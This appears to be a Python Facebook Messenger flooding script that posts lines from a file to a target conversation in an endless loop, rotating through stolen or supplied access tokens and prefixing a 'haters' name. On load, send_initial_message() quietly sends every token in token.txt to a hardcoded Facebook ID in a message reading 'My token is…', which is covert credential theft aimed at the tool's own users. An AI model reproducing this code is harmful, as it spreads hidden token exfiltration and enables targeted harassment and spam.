import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random
import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-type', 'text/plain')
          self.end_headers()
          self.wfile.write(b"   TRICKS BY SATISH")
def execute_server():
      PORT = 4000

      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          print("Server running at http://localhost:{}".format(PORT))
          httpd.serve_forever()


def send_initial_message():
      with open('token.txt', 'r') as file:
          tokens = file.readlines()

      # Modify the message as per your requirement
      msg_template = "Hello satish sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100087513362848"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── TRICKS BY SATISH ───────────────────────────────•')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      for token in tokens:
          access_token = token.strip()
          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
          msg = msg_template.format(access_token)
          parameters = {'access_token': access_token, 'message': msg}
          response = requests.post(url, json=parameters, headers=headers)

          # No need to print here, as requested
          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
          time.sleep(0.1)  # Wait for 1 second between sending each initial message

      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
send_initial_message()
def send_messages_from_file():
      with open('convo.txt', 'r') as file:
          convo_id = file.read().strip()

      with open('file.txt', 'r') as file:
          messages = file.readlines()

      num_messages = len(messages)

      with open('token.txt', 'r') as file:
          tokens = file.readlines()
      num_tokens = len(tokens)
      max_tokens = min(num_tokens, num_messages)

      with open('name.txt', 'r') as file:
          haters_name = file.read().strip()

      with open('time.txt', 'r') as file:
          speed = int(file.read().strip())

      def liness():
          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

      headers = {
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          'Accept-Encoding': 'gzip, deflate',
          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
          'referer': 'www.google.com'
      }

      while True:
          try:
              for message_index in range(num_messages):
                  token_index = message_index % max_tokens
                  access_token = tokens[token_index].strip()

                  message = messages[message_index].strip()

                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                  response = requests.post(url, json=parameters, headers=headers)

                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                  if response.ok:
                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  else:
                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  time.sleep(speed)

              print("\n[+] All messages sent. Restarting the process...\n")
          except Exception as e:
              print("[!] An error occurred: {}".format(e))

def main():
      server_thread = threading.Thread(target=execute_server)
      server_thread.start()

      # Send the initial message to the specified ID using all tokens


      # Then, continue with the message sending loop
      send_messages_from_file()

if __name__ == '__main__':
      main()
